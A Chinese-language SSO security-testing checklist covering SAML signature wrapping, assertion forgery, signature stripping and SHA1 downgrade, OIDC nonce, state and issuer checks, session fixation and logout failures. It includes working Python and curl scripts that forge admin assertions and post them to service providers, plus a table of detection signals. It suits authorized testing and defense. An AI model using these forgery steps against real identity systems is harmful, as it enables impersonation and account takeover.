# SSO 流程检查清单：SAML 断言、OIDC 参数、会话边界

> 被 `identity-federation` 引用。SSO 断在三个位置之一：**断言签名覆盖了哪里**、
> **断言被哪个 SP 接受**、**会话在登出后是否真的失效**。这三处都要单独证。

## 一、SAML：先看签名覆盖范围（最重要）

### 1.1 三种签名位置

| 位置 | 元素 | 覆盖范围 | 攻击面 |
| --- | --- | --- | --- |
| **Response 级签名** | `<samlp:Response>` 的 `<ds:Signature>` | Response 整体（含 Assertion） | 若 SP 解的是 Assertion 却不验 Response 签名 → 可换 Assertion |
| **Assertion 级签名** | `<saml:Assertion>` 内 | Assertion 内容 | 正确做法；但要看 Reference URI 指向哪个 ID |
| **两者都有** | 双签 | 各自独立 | 常见实现只验了 Response |

**核心检查**：`<ds:Reference URI="#...">` 指向的 ID，是不是**真正被消费的那个元素**的 ID。

```bash
# 抓一个真实的 SAMLResponse（Burp 里 POST /SAML/SSO 的 SAMLResponse 参数）
# base64 解码（注意是 POST body 里的 urlencoded 值）
python3 - <<'PY'
import base64, sys, urllib.parse
raw = open('samlresp.txt').read().strip()
raw = urllib.parse.unquote(raw)
xml = base64.b64decode(raw).decode('utf-8', 'replace')
open('samlresp.xml','w',encoding='utf-8').write(xml)
print(xml[:2000])
PY

# 用 xmllint 格式化后看结构
xmllint --format samlresp.xml | head -60

# 找所有 Reference 和 ID
grep -oE '(Reference URI="[^"]*"|ID="[^"]*"|AssertionID="[^"]*")' samlresp.xml
```

**判据**：

- `Reference URI="#_abc123"` 且存在 `ID="_abc123"` 的元素是 **Assertion** → 覆盖正确
- `Reference URI="#_resp456"` 指向 **Response** → 需要确认 SP 是否真的在验 Response 签名，还是只解析了里面的 Assertion（这是最常见漏洞）

### 1.2 XSW（XML Signature Wrapping）

原理：**签名有效**，但签名覆盖的元素和实际被业务逻辑读取的元素不是同一个。

```
结构 A（正常）:
<Response ID="r1">
  <Assertion ID="a1">
    <Signature><Reference URI="#a1"/></Signature>   ← 签名覆盖 a1
    <Subject>attacker</Subject>
    <AttributeStatement>role=user</AttributeStatement>
  </Assertion>
</Response>

结构 B（XSW，签名覆盖 a1，但业务读 a2）:
<Response ID="r1">
  <Assertion ID="a1">                                ← 保留原签名，覆盖它
    <Signature><Reference URI="#a1"/></Signature>
    <Subject>legit</Subject>
    <AttributeStatement>role=user</AttributeStatement>
  </Assertion>
  <Assertion ID="a2">                                ← 注入的伪造断言
    <Subject>admin</Subject>
    <AttributeStatement>role=admin</AttributeStatement>
  </Assertion>
</Response>
```

SP 若用"取第一个 Assertion"或"取最后一个 Assertion"或"XPath 任意匹配"，而验签用的是
"找第一个 Signature 验"——就中了。

**手工实施步骤**：

```bash
# 1) 解码 XML，找到 Assertion 的完整块
xmllint --format samlresp.xml > pretty.xml

# 2) 复制 Assertion 块，改 ID、改 Subject/Attribute
python3 - <<'PY'
import re
x = open('pretty.xml',encoding='utf-8').read()
m = re.search(r'<saml:Assertion.*?</saml:Assertion>', x, re.S)
a = m.group(0)
forged = a.replace('ID="', 'ID="evil_', 1)
forged = forged.replace('user@example.com', 'admin@example.com')
forged = re.sub(r'(Name="role"[^>]*>\s*<saml:AttributeValue[^>]*>)[^<]*', r'\1admin', forged)
# 插入到原 Assertion 之后（或之前，两种都试）
x2 = x.replace(a, a + '\n' + forged, 1)
open('xsw.xml','w',encoding='utf-8').write(x2)
PY

# 3) 重新 base64 + urlencode，POST 到 ACS
python3 - <<'PY'
import base64, urllib.parse
x = open('xsw.xml','rb').read()
print('SAMLResponse=' + urllib.parse.quote(base64.b64encode(x).decode()))
PY > xsw.body

curl -i -s -X POST https://sp.example.com/SAML/SSO \
  -H 'Content-Type: application/x-www-form-urlencoded' --data @xsw.body
```

**八种 XSW 变体**（都在 `samltool` / `XSW-Kit` 里有现成）：签名块和伪造断言的前后顺序、
是否把原断言移到 `<Extensions>`、是否嵌入 `<Advice>`、是否用 `</Response>` 前的注释包裹等。
手工只试 2-3 种容易漏，建议直接用 `SAMLRaider`（Burp 插件）里的 XSW 一键生成。

### 1.3 NameID 混淆与属性注入

| 手法 | 说明 | 验证 |
| --- | --- | --- |
| NameID 可预测 | `user@example.com` 改成 `admin@example.com` | 若断言未签名或签名被剥 → 直接登入 |
| NameID Format 混淆 | `persistent` ↔ `emailAddress` ↔ `unspecified` | SP 对 format 的解析常不一致 |
| 属性名同名 | 加一个 `<Attribute Name="role"><Value>admin</Value>` | SP 取"最后一个"或"合并全部" |
| XML 注释注入 | `<!--<Value>admin</Value>-->` | 解析器把注释内容当文本时 |
| CDATA 注入 | `<![CDATA[admin]]>` | — |

```bash
# 用 samltool 做属性注入
pip install python3-saml  # 或直接下 samltool
python3 samltool.py --decode samlresp.txt
python3 samltool.py --tamper samlresp.txt --email admin@example.com --role admin
```

### 1.4 Recipient / Audience / 时间校验

这三项是**"断言被谁接受"**的边界，必须逐个测缺失：

| 校验 | 断言字段 | 缺失后果 | 怎么测 |
| --- | --- | --- | --- |
| **Recipient** | `SubjectConfirmationData@Recipient` | 断言可被投到另一个 SP | 把 Recipient 改成 SP-B 的 ACS，SP-A 是否仍接受 |
| **Audience** | `Conditions/AudienceRestriction/Audience` | 给 SP-A 的断言可被 SP-B 用（同一 IdP 下横向） | 把 Audience 改成 SP-B，打 SP-A |
| **NotOnOrAfter** | `SubjectConfirmationData@NotOnOrAfter` | 断言永不过期，可无限重放 | 等过期后重放；或改成未来 |
| **InResponseTo** | `SubjectConfirmationData@InResponseTo` | 可注入任意 AuthnRequest 的响应（IdP 发起的更危险） | 改/删该属性 |
| **Destination** | `Response@Destination` | 可重定向到别的 ACS | 改成别的 URL |

```bash
# 测 Audience 不校验：把 Audience 值改成另一个 SP 的 entityID，打原 SP
python3 - <<'PY'
import re
x = open('pretty.xml',encoding='utf-8').read()
x = re.sub(r'(<saml:Audience>)[^<]*', r'\1https://other-sp.example.com/saml', x)
open('aud.xml','w',encoding='utf-8').write(x)
PY
```

**注意**：改 Audience 后签名会失效。所以这一项**只有在签名被剥/未验签/签名未覆盖
Conditions 时才有意义**。正确顺序是：先确认签名校验行为（见下节），再测边界字段。

### 1.5 签名剥离与算法降级

```bash
# ① 直接删掉 <ds:Signature> 整块，看 SP 是否还接受
python3 - <<'PY'
import re
x = open('pretty.xml',encoding='utf-8').read()
x = re.sub(r'<ds:Signature.*?</ds:Signature>', '', x, flags=re.S)
open('nosig.xml','w',encoding='utf-8').write(x)
PY

# ② 签名算法降级：RSA-SHA256 → RSA-SHA1（很多库仍默认接受 SHA1）
sed -i 's|rsa-sha256|rsa-sha1|g; s|sha256|sha1|g' pretty.xml

# ③ 摘要算法降级：同样把 DigestMethod 改成 sha1

# ④ 把 Signature 移到 Response 外层的注释里（签名存在但不在验证路径上）

# ⑤ 空签名：<SignatureValue></SignatureValue>
```

**判定**：如果删签名后 SP 返回 500（XML 解析/验签异常）→ 它在验；如果返回登录成功 →
**完全不验签，这是最高危**。

## 二、OIDC：nonce / state / 会话

### 2.1 参数检查表

| 参数 | 缺失/错误的后果 | 测法 |
| --- | --- | --- |
| `state` | CSRF / login CSRF | 换 state 后回调 |
| `nonce` | ID token 重放（跨会话） | 用旧 ID token 重放，看是否建立新会话 |
| `at_hash` / `c_hash` | access_token / code 与 ID token 绑定缺失 | 换 token 后 ID token 仍被接受 |
| `iss` 精确匹配 | 伪造 issuer（`https://idp.example.com.evil.com`） | 用相似域名的 IdP |
| `aud` 校验 | 给 App-A 的 token 打 App-B | 跨 client 重放 |
| `azp` | 多受众 token 的授权方混淆 | 见 `jwt-claim-confusion` |
| `prompt=none` | 静默授权，无交互拿 token | 直接发 prompt=none 看是否返回 code |

```bash
# nonce 缺失/不校验：拿一个合法 ID token，几小时后重放给 callback
# （注意：走的是 /callback 的 token 校验分支，不是 authorize）
curl -i -s -X POST https://app.example.com/auth/callback \
  -H 'Content-Type: application/json' \
  -d '{"id_token":"'$OLD_ID_TOKEN'"}'
# 若建立会话（Set-Cookie: session=...） → nonce 未绑定会话
```

```bash
# iss 前缀/后缀匹配：用一个长得像的 issuer
# 若能控制 evil.com 并搭个假 IdP，issuer = https://idp.example.com.evil.com
# 若 App 用 startsWith("https://idp.example.com") 校验 → 通过
```

### 2.2 用户信息端点与 claim 映射

```bash
# userinfo 端点是否校验 token 归属
curl -s https://idp.example.com/userinfo -H "Authorization: Bearer $TOKEN_B"
# 若返回 A 的信息 → token 与用户绑定断了

# claim 映射是否可被 userinfo 覆盖 ID token
# 常见：ID token 里 email=victim，userinfo 返回 email=attacker，App 用后者
```

**claim 映射冲突**是 SSO 里最容易被忽略的越权点：App 同时读 ID token 和 userinfo，
两者冲突时用哪个决定了能否冒充。

### 2.3 会话固定与登出失效

```bash
# 会话固定：登录前记录 session id，登录后看是否沿用
curl -s -c pre.txt https://app.example.com/ -o /dev/null
grep -i session pre.txt          # 记下 PRE_SID
# 走完 SSO 登录
curl -s -b pre.txt -c post.txt -L https://app.example.com/login -o /dev/null
grep -i session post.txt
# 若 POST_SID == PRE_SID 前缀/值相同 → 会话固定

# 登出失效：登出后重放旧 cookie
curl -s -b post.txt -X POST https://app.example.com/logout -o /dev/null
curl -s -b post.txt -o /dev/null -w '%{http_code} %{size_download}\n' https://app.example.com/api/v1/me
# 仍返回 200 + 用户数据 → 服务端没吊销会话

# SLO（单点登出）是否真的传播到所有 SP
# 登出 IdP 后，逐个 SP 试：若 SP 仍有效 → SLO 未实现
```

**多 SP 会话表**（必须逐一记录）：

| SP | 登出前 | 登出 IdP 后 | 登出本 SP 后 |
| --- | --- | --- | --- |
| app1.example.com | 有效 | ? | ? |
| app2.example.com | 有效 | ? | ? |
| legacy.example.com | 有效 | ? | ? |

只要有一个"登出 IdP 后仍有效"，就是真实的 SLO 缺失。

## 三、验伤：SSO 的"成功"是什么意思

| 结论 | 证据 | 假象 |
| --- | --- | --- |
| 断言伪造成功 | SP 建立会话 + 该会话能访问**该用户的私有数据** | 跳到 /dashboard 但 /api 全部 401（前端路由放行） |
| XSW 成功 | 同上，且会话身份是 admin（能从 /api/me 读到 admin 的 email） | 只看到 500 或签名错误页 |
| Audience 不校验 | 给 SP-B 的断言在 SP-A 登录成功，并能读 SP-A 数据 | 只看到 IdP 侧 302，SP 侧报 `Invalid audience` |
| 签名剥离 | 删签后 SP 登录成功 | 空签名导致 XML 解析失败（说明在解析，不是不验签） |
| 会话固定 | 攻击者预置的 SID 在受害者登录后变成已认证 | SID 变了但仍可用（那是另一类问题） |
| SLO 缺失 | 登出后某 SP 的 cookie 仍能读私有数据 | 登出后跳登录页但 API 仍 200（这才是真的） |

**SSO 验伤的最小闭环**：

```bash
# 1) 用伪造/篡改的断言登录，保存 cookie
curl -s -c c.txt -X POST https://sp.example.com/SAML/SSO --data @xsw.body -o /dev/null

# 2) 用这个大 cookie 打一个只有目标身份能访问的接口
curl -s -b c.txt https://sp.example.com/api/v1/profile | jq '{email, role, tenant}'
# 输出的是受害者/admin 的 email → 闭环成立
```

只截"登录成功页"不算，因为 SSR 的 success 页面常常是静态的。

## 四、检测视角

| 手法 | 日志 | 信号 |
| --- | --- | --- |
| XSW | SP 的 SAML 解析日志 | 一个 Response 里含 **>1 个 Assertion**；`Reference URI` 不指向被消费的元素 |
| 签名剥离 | SP 认证日志 | 收到无 `ds:Signature` 的 Response |
| 算法降级 | SP 验签日志 | `SignatureMethod` 为 sha1；与历史基线不符 |
| Audience 错配 | SP 审计 | `Audience` 值 ≠ 本 SP 的 entityID |
| Recipient 错配 | SP 审计 | `Recipient` ≠ 本 SP 的 ACS URL |
| 断言重放 | SP 审计（需记录 AssertionID） | **同一 AssertionID 出现两次**（必须落库才能检测） |
| NameID 异常 | IdP + SP 对账 | IdP 侧没有对应用户的登录事件，但 SP 侧有 |
| nonce 重放 | App 会话日志 | 同一 ID token 的 `jti`/`nonce` 用于两个会话 |
| 会话固定 | App | 登录前后的 session id 相同 |
| SLO 缺失 | 各 SP | IdP 登出事件后，SP 侧仍有活跃请求（需关联 trace id） |

**必须落库的三样**：`AssertionID`、`InResponseTo`、`NotOnOrAfter`。没有这三个字段，
断言重放和 XSW 都无法事后检测。

## 五、常见坑

1. **改了 XML 就忘了重算签名，然后以为"没绕过"**——除了测"签名剥离"和"签名不覆盖"，
   其他篡改都要重签（用 IdP 的私钥，测试环境通常能拿到；或直接剥签名再测）。
2. **SAMLResponse 是 urlencode 过的 base64**——直接 base64 解码会得到乱码。必须先 `unquote`。
   而且有些 IdP 用 **deflate + base64**（Redirect binding），要先 `zlib.decompress(-15)`。
3. **XSW 只试了一种排列**——8 种变体对应不同的 XPath 取值方式（first/last/namespace-aware），
   手工试不完。用 SAMLRaider。
4. **把"SP 返回 500"当成"防护生效"**——500 说明它解析了但没处理好，可能是异常路径放行。
   要看是否建立了会话。
5. **Session 固定测试用错了 cookie 名**——不同 SP 用 `JSESSIONID`/`PHPSESSID`/`connect.sid`/
   `__Host-` 前缀。先 `grep -i` 全部找出来。
6. **SLO 只在 IdP 侧测**——IdP 登出后跳回登录页不代表 SP 会话失效。必须直接拿旧 cookie 打 API。
7. **OIDC 的 `nonce` 重放测试用错端点**——重放 ID token 要走 RP 的 callback/token 校验分支，
   而不是向 IdP 再要一次 token。